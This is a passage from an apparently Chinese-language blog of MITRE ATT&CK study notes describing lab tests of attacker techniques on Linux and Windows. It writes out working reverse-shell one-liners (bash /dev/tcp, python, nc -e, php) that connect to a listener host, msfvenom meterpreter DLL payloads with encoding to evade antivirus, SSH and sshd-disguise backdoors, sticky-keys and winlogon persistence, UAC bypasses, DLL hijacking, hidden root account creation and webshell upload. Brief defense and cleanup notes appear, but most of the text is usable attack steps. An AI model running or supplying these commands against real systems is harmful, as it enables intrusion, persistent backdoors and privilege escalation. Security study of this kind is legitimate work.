src="/ATTACK%E5%AD%A6%E4%B9%A0/1.png" alt></li><li>本机打开监听端口，重启虚拟机，输入账号密码后，成功反弹shell</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/2.png" alt></li><li>弊端：直接这样反弹shell，虚拟机会一直卡住在登录中~，容易被发现，停止交互shell后，虚拟机才会登录成功</li><li>执行后门文件，python反弹shell</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/3.png" alt></li><li>反弹shell成功且用户成功登录</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/4.png" alt></li></ol><p><strong>本地测试~/.bashrc</strong></p><ol><li>同样，把执行命令添加到~/.bashrc，保存，本机打开监听</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/5.png" alt></li><li>只要虚拟机打开新shell，都会反弹shell（执行命令）</li><li>图略</li></ol><p><strong>防御</strong></p><ol><li>检查相关文件预防是否被留后门</li><li>扫描本地是否存在后门文件或隐藏的后门文件</li><li>检查是否存在敏感进程或隐藏进程</li><li>etc.</li></ol><h2 id="0x22-Linux-reverse-shell"><a href="#0x22-Linux-reverse-shell" class="headerlink" title="0x22 Linux-reverse shell"></a>0x22 Linux-reverse shell</h2><p>测试环境：192.168.100.4、192.168.100.8、192.168.100.15<br><strong>bash</strong></p><ol><li>远程服务器终端执行命令：bash -i &gt;&amp; /dev/tcp/[本地主机IP]/[指定端口] 0&gt;&amp;1 #0：标准输入，1：标准输出，2：标准错误，&gt;、&lt;：重定向，0&gt;1：标准输入重定向到文件1,0&gt;&amp;1：标准输入重定向到标准输出，&gt;&amp;：重定向标准输出和标准错误</li><li>本地主机监听命令：nc -lvp [指定端口]</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/33.png" alt></li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/34.png" alt></li></ol><p><strong>python</strong></p><ol><li>192.168.100.15：python -c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘192.168.100.4’,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([‘/bin/bash’,’-i’]);”</li><li>192.168.100.4：nc -lvp 8888</li></ol><p><strong>nc</strong></p><ol><li>192.168.100.15全功能版本（带-e参数）：nc -e /bin/bash 192.168.100.4 8888</li><li>192.168.100.4：nc -lvp 8888</li></ol><p><strong>nc与管道符</strong></p><ol><li>192.168.100.4：nc -lvp 7777 #负责发送命令</li><li>192.168.100.4：nc -lvp 8888 #负责接收信息</li><li>192.168.100.15：nc 192.168.100.4 7777 | /bin/bash | nc 192.168.100.4 8888</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/35.png" alt></li></ol><p><strong>php</strong></p><ol><li>php -r ‘exec(“/bin/bash -i &gt;&amp; /dev/tcp/192.168.100.4/8888 0&gt;&amp;1”);’</li></ol><p><strong>java</strong><br><strong>perl</strong><br><strong>ruby</strong><br>…<br><a href="http://localhost:4000/shell/" target="_blank" rel="noopener">本地博客</a><br><a href="https://10fteam.github.io/shell/">github博客</a></p><h2 id="0X23-Linux-SSH-backdoor"><a href="#0X23-Linux-SSH-backdoor" class="headerlink" title="0X23 Linux-SSH backdoor"></a>0X23 Linux-SSH backdoor</h2><p><strong>ssh免密登录后门</strong></p><ol><li>正常的密码登录</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/36.png" alt></li><li>ln -sf /usr/sbin/sshd /tmp/su;nohup /tmp/su -oPort=2222 &amp;</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/37.png" alt></li><li>再次登录，输入任意密码即登录成功</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/38.png" alt></li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/39.png" alt></li><li><a href="https://www.freebuf.com/articles/system/138753.html" target="_blank" rel="noopener">参考</a></li></ol><p><strong>perl脚本伪装sshd</strong></p><ol><li>先转换端口为big 网络字节序中的16进制字符串\x00\x00XX格式</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/40.png" alt></li><li>得 \x00\x0009</li><li>perl脚本内容<pre><code>#!/usr/bin/perlexec&quot;/bin/bash&quot;if(getpeername(STDIN)=~/^..09/);exec{&quot;/usr/bin/sshd&quot;}&quot;/usr/sbin/sshd&quot;.@ARGV;</code></pre></li><li>把/usr/sbin/sshd移到/usr/bin/sshd</li><li>将伪装的perl脚本保存到/usr/sbin/sshd</li><li>赋权：chmod +x /usr/sbin/sshd</li><li>重启服务：/etc/init.d/ssh restart</li><li>本地主机：socat STDIO TCP4:192.168.100.8:22,sourceport=12345</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/41.png" alt></li><li>查看进程连接</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/42.png" alt></li><li>增强隐蔽性，copy /bin/bash 重命名为/bin/sshd，perl代码改为<pre><code>#!/usr/bin/perlexec&quot;/bin/sshd&quot;if(getpeername(STDIN)=~/^..09/);exec{&quot;/usr/bin/sshd&quot;}&quot;/usr/sbin/sshd&quot;.@ARGV;</code></pre></li></ol><p><strong>SSH公钥免密登录</strong></p><ol><li><a href="http://localhost:4000/backdoors/" target="_blank" rel="noopener">本地博客</a></li><li><a href="https://10fteam.github.io/backdoors/">github博客</a></li></ol><h2 id="0x30-windows"><a href="#0x30-windows" class="headerlink" title="0x30 windows"></a>0x30 windows</h2><h2 id="0x31-T1015-Windows-Accessibility-Features（辅助功能）"><a href="#0x31-T1015-Windows-Accessibility-Features（辅助功能）" class="headerlink" title="0x31 T1015-Windows Accessibility Features（辅助功能）"></a>0x31 <span id="T1015">T1015-Windows Accessibility Features（辅助功能）</span></h2><ol><li>windows有辅助功能，可以在用户登录之前（登录窗口屏幕），打开组合键启动。</li><li>攻击者可以修改这些功能或程序的启动方式，来获取命令提示符或后门程序，而不需登录系统。</li><li>两种常见的辅助功能程序分别是</li><li>C:\Windows\System32\sethc.exe：按五次Shift键启动</li><li>C:\Windows\System32\utilman.exe时启动；按Windows + U组合键启动。</li><li>其他辅助功能：</li><li>On-Screen Keyboard: C:\Windows\System32\osk.exe</li><li>Magnifier: C:\Windows\System32\Magnify.exe</li><li>Narrator: C:\Windows\System32\Narrator.exe</li><li>Display Switcher: C:\Windows\System32\DisplaySwitch.exe</li><li>App Switcher: C:\Windows\System32\AtBroker.exe</li></ol><p><strong>本地测试</strong></p><ol><li>虚拟机：windows server 2008</li><li>例如：osk.exe</li><li>powershell（需要管理员权限）终端<a href="#jump1">执行下面代码</a>（整块复制执行，报错就键盘输入）</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/6.png" alt></li><li>执行之后，刷新注册表，就会显示添加成功</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/7.png" alt></li><li>然后执行C:\Windows\System32\osk.exe，就会弹出cmd.exe，<a href="#jump2">清除命令</a></li><li>同理，<a href="#jump1">执行代码</a>中的osk.exe可换成sethc.exe、utilman.exe、magnify.exe、narrator.exe、DisplaySwitch.exe、atbroker.exe</li><li>实在执行不了，就一步步来：win+r——regedit——HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options——新建项——命名例如sethc.exe——新建字符串值——名称debugger——数据C:\Windows\System32\cmd.exe，然后锁屏，按五次shift</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/8.png" alt></li></ol><p><span id="jump1">辅助功能：powershell执行代码</span></p><pre><code>$registryPath = &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot;$Value = &quot;C:\windows\system32\cmd.exe&quot;$Name = &quot;Debugger&quot;IF(!(Test-Path $registryPath)) {  New-Item -Path $registryPath -Force  New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force }ELSE {  New-ItemProperty -Path $registryPath -Name $name -Value $Value }</code></pre><p><span id="jump2">清除命令</span></p><pre><code>reg delete &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot; /v Debugger /f</code></pre><p><strong>防御</strong></p><ol><li>查看注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options下是否存在可疑项</li><li>查看C盘下是否存在可疑的可执行后门文件</li><li>查看进程是否存在可疑进程</li><li>监控可执行文件和执行命令</li><li>etc.</li></ol><h2 id="0x32-T1098-windows-Admin-Account-Manipulate（管理员账户操作）"><a href="#0x32-T1098-windows-Admin-Account-Manipulate（管理员账户操作）" class="headerlink" title="0x32 T1098-windows Admin Account Manipulate（管理员账户操作）"></a>0x32 <span id="T1098">T1098-windows Admin Account Manipulate（管理员账户操作）</span></h2><ol><li>账户被操作，会影响管理员的维护与某些权限的访问。操作有：修改权限，修改登录密码，添加或删除用户或用户组，修改原用户配置、系统配置等等操作。</li><li>powershell（管理员权限）终端<a href="#jump3">执行代码</a>，报错可能是版本问题（2.0 没有Get-CIMInstance），或者字符串格式问题等</li><li>$PSVersionTable #查看版本，2.0</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/9.png" alt></li><li><a href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=30653" target="_blank" rel="noopener">先安装Microsoft .NET Framework 4.5</a></li><li><a href="https://docs.microsoft.com/en-us/powershell/scripting/install/installing-windows-powershell?view=powershell-6" target="_blank" rel="noopener">更新powershell版本</a></li><li>再看看版本：$PSVersionTable，5.1</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/10.png" alt></li><li>再<a href="#jump3">执行代码</a></li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/12.png" alt></li><li>Administrator已被重命名</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/13.png" alt></li><li>手动改名（改回），右击我的电脑——管理——本地用户和组——用户——刚改的名字——右击——重命名——xxx</li></ol><p><span id="jump3">原脚本</span></p><pre><code>$x = Get-Random -Minimum 2 -Maximum 9999$y = Get-Random -Minimum 2 -Maximum 9999$z = Get-Random -Minimum 2 -Maximum 9999$w = Get-Random -Minimum 2 -Maximum 9999Write-Host HaHaHa_$x$y$z$w$hostname = (Get-CIMInstance CIM_ComputerSystem).Name$fmm = Get-CimInstance -ClassName win32_group -Filter &quot;name = &#39;Administrators&#39;&quot; | Get-CimAssociatedInstance -Association win32_groupuser | Select Nameforeach($member in $fmm) {    if($member -like &quot;*Administrator*&quot;) {        Rename-LocalUser -Name $member.Name -NewName &quot;HaHaHa_$x$y$z$w&quot;        Write-Host &quot;Successfully Renamed Administrator Account on&quot; $hostname        }    }</code></pre><h2 id="0x33-T1138-windows-Application-Shimming-Attack（直译：应用程序匀速攻击）"><a href="#0x33-T1138-windows-Application-Shimming-Attack（直译：应用程序匀速攻击）" class="headerlink" title="0x33 T1138-windows Application Shimming Attack（直译：应用程序匀速攻击）"></a>0x33 <span id="T1138">T1138-windows Application Shimming Attack（直译：应用程序匀速攻击）</span></h2><ol><li>Microsoft为了解决与新windows操作系统的旧应用程序不兼容的问题，发布了应用程序兼容性工具包ACT，属于<a href="https://docs.microsoft.com/en-gb/windows-hardware/get-started/adk-install" target="_blank" rel="noopener">windows评估和部署工具包ADK</a>的一部分。</li><li>该工具包含一个“injectdll”的修复程序，可用于将DLL注入应用程序达到持久控制的作用。</li><li>msfvenom生成反弹shell的dll后门程序</li><li>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=4444 -f dll&gt;test.dll</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/14.png" alt></li><li><a href="https://docs.microsoft.com/zh-cn/windows-hardware/get-started/adk-install" target="_blank" rel="noopener">Microsoft Application Compatibility Toolkit</a></li><li>启动应用程序兼容性工具包</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/16.png" alt></li><li>选择一个已安装的应用程序</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/17.png" alt></li><li>可用的针对32位应用程序的兼容性修补程序有369个，选择injectdll，使用刚使用msfvenom生成的dll文件注入Firefox。</li><li>点击Parameters，设置dll文件的位置</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/18.png" alt></li><li>save，保存为test.sdb</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/15.png" alt></li><li>可在Microsoft Application Compatibility Toolkit中直接选择安装</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/24.png" alt></li><li>sdbinst.exe（默认位于c:\windows\system32下）是用于部署自定义数据库文件的应用程序，也可以使用<a href="https://github.com/evil-e/sdb-explorer" target="_blank" rel="noopener">sdb-explorer</a>来安装程序</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/19.png" alt></li><li>该应用程序已安装在系统</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/20.png" alt></li><li>shim数据库文件已被复制到windows目录下</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/21.png" alt></li><li>msfconsole启动监听</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/22.png" alt></li><li>服务器启动Firefox，msf就获取到meterpreter会话了。</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/23.png" alt></li><li><strong>除了生成.sdb文件，还可以直接创建新的shim数据库文件，powershell执行命令</strong></li><li>Copy-Item …….\*.sdb C:\Windows\apppatch\Custom\*.sdb</li><li>Copy-Item …….\*.sdb C:\Windows\apppatch\Custom64\*.sdb</li><li><strong>删除命令</strong></li><li>Remove-Item C:\Windows\apppatch\Custom\*.sdb</li><li>Remove-Item C:\Windows\apppatch\Custom64\*.sdb</li><li><strong>还可以修改注册表，powershell执行命令</strong></li><li>New-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom” -Name “test” -Value “test”</li><li>New-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB” -Name “test” -Value “test”</li><li><strong>删除命令</strong></li><li>Remove-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom” -Name “test”</li><li>Remove-ItemProperty -Path HKLM:”\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB” -Name “test”</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/25.png" alt></li></ol><p><strong>参考</strong><br><a href="https://pentestlab.blog/2019/12/16/persistence-application-shimming/" target="_blank" rel="noopener">https://pentestlab.blog/2019/12/16/persistence-application-shimming/</a><br><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/" target="_blank" rel="noopener">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/</a><br><a href="https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1138/T1138.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1138/T1138.md</a></p><h2 id="0x34-T1197-windows-BITS-Jobs-Windows后台智能传输服务"><a href="#0x34-T1197-windows-BITS-Jobs-Windows后台智能传输服务" class="headerlink" title="0x34 T1197-windows BITS Jobs (Windows后台智能传输服务)"></a>0x34 <span id="T1197">T1197-windows BITS Jobs (Windows后台智能传输服务)</span></h2><ol><li><strong>描述：</strong></li><li>BITS (后台智能传送服务) 是一个Windows组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</li><li><strong>危害：</strong></li><li>攻击者可能会运行恶意代码后滥用BITS进行下载，执行甚至清理文件，这些危险操作，可能防火墙是允许的。</li><li></li><li><strong>cmd使用bitsadmin.exe下载文件命令</strong></li><li>bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}</li><li><strong>删除文件命令</strong></li><li>del #{local_file}</li><li></li><li><strong>powershell执行</strong></li><li>Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}</li><li><strong>删除文件命令</strong></li><li>Remove-Item #{local_file}</li><li></li><li><strong>例子</strong></li><li>bitsadmin.exe /transfer /Download /priority Foreground <a href="http://192.168.100.3/1.txt" target="_blank" rel="noopener">http://192.168.100.3/1.txt</a> f:\test\11.txt</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/43.png" alt></li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/44.png" alt></li><li><strong>多步骤下载执行脚本</strong></li><li>bitsadmin.exe /create #{bits_job_name}</li><li>bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}</li><li>bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}</li><li>bitsadmin.exe /complete AtomicBITS</li><li>bitsadmin.exe /resume #{bits_job_name}</li></ol><h2 id="0x35-T1004-windows-winlogon"><a href="#0x35-T1004-windows-winlogon" class="headerlink" title="0x35 T1004-windows winlogon"></a>0x35 <span id="T1004">T1004-windows winlogon</span></h2><ol><li>winlogon.exe是windows NT用户登录程序，用于管理用户登录、注销以及ctrl+alt+delete触发的secure attention sequence。</li><li>位置：C:\Windows\System32</li><li>注册表：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon</li><li>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</li></ol><p><strong>winlogon shell Key Persistence（持久性）</strong></p><ol><li>Set-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; “Shell” “explorer.exe, [要执行的程序]” -Force</li><li><strong>测试：设置命令</strong></li><li>powershell执行：Set-ItemProperty “HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; “Shell” “explorer.exe, c:\windows\system32\notepad.exe” -Force</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/26.png" alt></li><li>重启，同时自动启动了notepad.exe</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/27.png" alt></li><li><strong>清除命令</strong></li><li>Remove-ItemProperty -Path “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name “Shell” -Force</li></ol><p><strong>Winlogon Userinit Key Persistence（持久性）</strong></p><ol><li><strong>设置命令</strong></li><li>Set-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; “Userinit” “Userinit.exe, [要执行的程序]” -Force</li><li><strong>清除命令</strong></li><li>Remove-ItemProperty -Path “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name “Userinit” -Force</li></ol><p><strong>Winlogon Notify Key Logon Persistence（持久性）</strong></p><ol><li><strong>设置命令</strong></li><li>New-Item “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify” -Force</li><li>Set-ItemProperty “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify” “logon” “[要执行的程序]” -Force</li><li><strong>清除命令</strong></li><li>Remove-Item “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify” -Force</li></ol><h2 id="0x36-T1042-Change-Default-File-Association-更改默认文件关联"><a href="#0x36-T1042-Change-Default-File-Association-更改默认文件关联" class="headerlink" title="0x36 T1042-Change Default File Association(更改默认文件关联)"></a>0x36 <span id="T1042">T1042-Change Default File Association(更改默认文件关联)</span></h2><ol><li>打开文件时，将检查用于打开文件的默认程序（文件关联或处理程序）。</li><li>文件关联选择储存在windows注册表中，可由用户、管理员或具有注册表访问权限的程序进行编辑，也可由管理员使用内置的assoc实用程序进行编辑。</li><li>攻击者可修改给定文件扩展名的文件关联，目的是打开具有给定扩展名的文件时调用指定程序。</li><li><strong>例子：</strong></li><li>windows下的.txt默认是使用notepad.exe打开</li><li>注册表位置：</li><li>HKEY_CLASSES_ROOT\txtfile\shell\open\command</li><li>HKEY_CLASSES_ROOT\txtfile\shell\print\command</li><li>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/28.png" alt></li><li><strong>测试：</strong></li><li>cmd.exe /c assoc [指定文件扩展名]=”[指定文件类型，即让目标程序来打开]”</li><li>新建test.txt文件，内容：更改默认文件关联，改名为test.qwer</li><li>直接双击打开是无法打开的</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/29.png" alt></li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/30.png" alt></li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/31.png" alt></li></ol><h2 id="0x27-T1088-Bypass-User-Account-Control（绕过用户账户控制）"><a href="#0x27-T1088-Bypass-User-Account-Control（绕过用户账户控制）" class="headerlink" title="0x27 T1088-Bypass User Account Control（绕过用户账户控制）"></a>0x27 <span id="T1088">T1088-Bypass User Account Control（绕过用户账户控制）</span></h2><ol><li>windows用户账户控制（UAC），允许程序通过用户进行确认来提升权限，在管理员权限下执行任务。原理：通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助组织恶意程序损坏系统的效果。</li><li>github上各种UAC绕过技术：<a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME</a></li><li></li><li><a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" target="_blank" rel="noopener">使用事件查看器eventvwr.exe和注册表劫持进行无文件绕过UAC</a></li><li><strong>cmd命令行执行命令：</strong></li><li>reg add hkcu\software\classes\mscfile\shell\open\command /ve /d “#{executable_binary}” /f </li><li>cmd.exe /c eventvwr.msc #当执行eventvwr.msc时，就启动运行#{executable_binary}</li><li>#/ve：为注册表项添加空白值名，/d：给添加的注册表valuename的赋值，/f：不用提示强制覆盖现有注册表项，/c：执行字符串指定的命令然后终止</li><li><strong>cmd命令行删除命令：</strong></li><li>reg delete hkcu\software\classes\mscfile /f &gt;null 2&gt;&amp;1</li><li><strong>例子：</strong></li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/45.png" alt></li><li></li><li><strong>powershell命令行执行命令：</strong></li><li>new-item “hkcu:\software\classes\mscfile\shell\open\command” -force #新建目录项，-force：强制执行</li><li>set-itemproperty “hkcu:\software\classes\mscfile\shell\open\command” -Name “(default)” -value “c:\windows\system32\calc.exe” -force #设值</li><li>start-process “c:\windows\system32\eventvwr.msc”</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/46.png" alt></li><li><strong>powershell命令行删除命令：</strong></li><li>remove-item “hkcu:\software\classes\mscfile” -force -recurse -erroraction ignore #-recurse：递归，-erroraction ignore：忽略错误</li><li></li><li>使用ComputerDefaults.exe绕过UAC（大同小异）</li><li><strong>cmd命令行执行命令：</strong></li><li>New-Item “HKCU:\software\classes\ms-settings\shell\open\command” -Force</li><li>New-ItemProperty “HKCU:\software\classes\ms-settings\shell\open\command” -Name “DelegateExecute” -Value “” -Force</li><li>Set-ItemProperty “HKCU:\software\classes\ms-settings\shell\open\command” -Name “(default)” -Value “#{executable_binary}” -Force</li><li>Start-Process “C:\Windows\System32\ComputerDefaults.exe”</li><li><strong>cmd命令行删除命令：</strong></li><li>Remove-Item “HKCU:\software\classes\ms-settings” -force -Recurse -ErrorAction Ignore</li></ol><h2 id="0x38-T1038-DLL搜索顺序劫持"><a href="#0x38-T1038-DLL搜索顺序劫持" class="headerlink" title="0x38 T1038-DLL搜索顺序劫持"></a>0x38 <span id="T1038">T1038-DLL搜索顺序劫持</span></h2><ol><li>windows系统使用一种通用方法来查找要加载到程序的DLL。</li><li>攻击者可能会利用windows DLL搜索顺序和程序模糊地指定DLL来提权或维持权限。攻击者会通过将恶意DLL放置到windows搜索的合法DLL之前的位置，来执行DLL预加载（也称二进制植入攻击）。</li><li>攻击者也可以替换原DLL或修改<a href="https://www.cnblogs.com/lidabo/archive/2013/12/19/3482593.html" target="_blank" rel="noopener">.manifest</a>，或<a href="https://www.cnblogs.com/ajuanabc/archive/2008/12/27/2462782.html" target="_blank" rel="noopener">.local重定向文件</a>、目录或连接来导致程序加载DLL的方式。</li><li></li><li><strong>启用“安全DLL查找模式”时（windows xp sp2系统以上会默认开启），查找顺序：</strong></li><li><ul><li>应用程序所在目录</li></ul></li><li><ul><li>系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32</li></ul></li><li><ul><li>16位系统目录。该项只是为了向前兼容的处理，可以不考虑</li></ul></li><li><ul><li>Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows</li></ul></li><li><ul><li>当前目录。GetCurrentDirectory返回的目录</li></ul></li><li><ul><li>环境变量PATH中所有目录</li></ul></li><li></li><li><strong>禁用“安全DLL查找模式”时，查找顺序：</strong></li><li><ul><li>应用程序所在目录</li></ul></li><li><ul><li>当前目录。GetCurrentDirectory返回的目录</li></ul></li><li><ul><li>系统目录。GetSystemDirectory返回的目录，通常是系统盘\Windows\System32</li></ul></li><li><ul><li>16位系统目录。该项只是为了向前兼容的处理，可以不考虑</li></ul></li><li><ul><li>Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\Windows</li></ul></li><li><ul><li>环境变量PATH中所有目录</li></ul></li><li></li><li><strong>例子：kali生成利用DLL</strong></li><li>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.100.4 LPORT=4444 -f dll &gt;/root/tmp/shell.dll #普通版，易被杀</li><li>msfvenom -p windows/x64/shell/reverse_tcp -e x64/xor -i 5 LHOST=192.168.100.4 LPORT=4444 -f dll &gt;/root/tmp/shell.dll #加编码与编码次数，</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/48.png" alt></li><li>上传shell.dll到靶机%appdata%目录下，开启msfconsole监听端口4444</li><li><strong>cmd命令行执行命令</strong></li><li>copy %windir%\system32\windowspowershell\v1.0\powershell.exe %appdata%\updater.exe</li><li>插曲：这里shell.dll改名为amsi.dll，或者直接生成amsi.dll</li><li>%appdata%\updater.exe -command exit</li><li>kali收到反弹shell</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/47.png" alt></li><li><strong>cmd命令行删除命令</strong></li><li>del %appdata%\updater.exe &gt;nul 2&gt;&amp;1</li><li>del %appdata%\amsi.dll &gt;nul 2&gt;&amp;1</li></ol><h2 id="0x40-Linux-and-windows"><a href="#0x40-Linux-and-windows" class="headerlink" title="0x40 Linux and windows"></a>0x40 Linux and windows</h2><h2 id="0x41-T1136-Creat-Account（创建账号）"><a href="#0x41-T1136-Creat-Account（创建账号）" class="headerlink" title="0x41 T1136-Creat Account（创建账号）"></a>0x41 <span id="T1136">T1136-Creat Account（创建账号）</span></h2><ol><li><p><strong>Linux</strong></p></li><li><p>创建用户：useradd -M -N -r -s /bin/bash -c 用户备注 [用户名]</p></li><li><p>删除用户：userdel [用户名]</p></li><li><p>useradd帮助信息</p></li><li><p><img src="/ATTACK%E5%AD%A6%E4%B9%A0/32.png" alt></p></li><li><p>创建root权限用户：useradd -o -u 0 -g 0 -M -d /root -s /bin/bash [用户名]</p></li><li><p>echo “[密码]” | passwd –stdin [用户名]</p></li><li><p>删除用户：userdel [用户名]</p></li><li><p><strong>windows cmd</strong></p></li><li><p>创建用户：net user /add [用户名]</p></li><li><p>删除用户：net user /del [用户名]</p></li><li><p><strong>windows powershell</strong></p></li><li><p>创建用户：New-LocalUser -Name [用户名] -NoPassword</p></li><li><p>删除用户：Remove-LocalUser -Name [用户名]</p></li></ol><h2 id="0x50-web-server-OR-application-program"><a href="#0x50-web-server-OR-application-program" class="headerlink" title="0x50 web server OR application program"></a>0x50 web server OR application program</h2><h2 id="0x51-T1100-windows-Linux-web-shell"><a href="#0x51-T1100-windows-Linux-web-shell" class="headerlink" title="0x51 T1100-windows/Linux web shell"></a>0x51 <span id="T1100">T1100-windows/Linux web shell</span></h2><ol><li>xcopy.exe：copy的扩展，可以把指定的目录连文件和目录结构一起拷贝，但不能拷贝系统文件；</li><li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">webshell集合</a></li><li>上传或拷贝webshell到服务器：xcopy webshell_file webshell_path</li><li>删除：del webshell_file</li><li>文件上传漏洞</li><li>文件包含漏洞</li><li>数据库漏洞</li><li>等等</li></ol><h2 id="0x52-T1176-Browser-Extensions（浏览器扩展）"><a href="#0x52-T1176-Browser-Extensions（浏览器扩展）" class="headerlink" title="0x52 T1176-Browser Extensions（浏览器扩展）"></a>0x52 <span id="T1176">T1176-Browser Extensions（浏览器扩展）</span></h2><ol><li>浏览器扩展程序或插件是小程序，可通过程序商店下载安装或离线下载安装。</li><li>扩展程序通常对浏览器可以访问的内容具有访问权限，恶意扩展程序可以通过伪装成合法扩展程序，用户下载安装恶意扩展程序后容易被攻击，危害用户浏览器的用户信息，甚至系统安全。</li><li>常见可安装扩展程序的浏览器：chrome、Firefox等等</li></ol><h2 id="0x60-privilege-escalation"><a href="#0x60-privilege-escalation" class="headerlink" title="0x60 privilege escalation"></a>0x60 privilege escalation</h2><h2 id="0x61-T1044-File-System-Permissions-Weakness"><a href="#0x61-T1044-File-System-Permissions-Weakness" class="headerlink" title="0x61 T1044-File System Permissions Weakness"></a>0x61 <span id="T1044">T1044-File System Permissions Weakness</span></h2><ol><li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1044/T1044.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1044/T1044.md</a></li></ol><h2 id="0x70-Discovery"><a 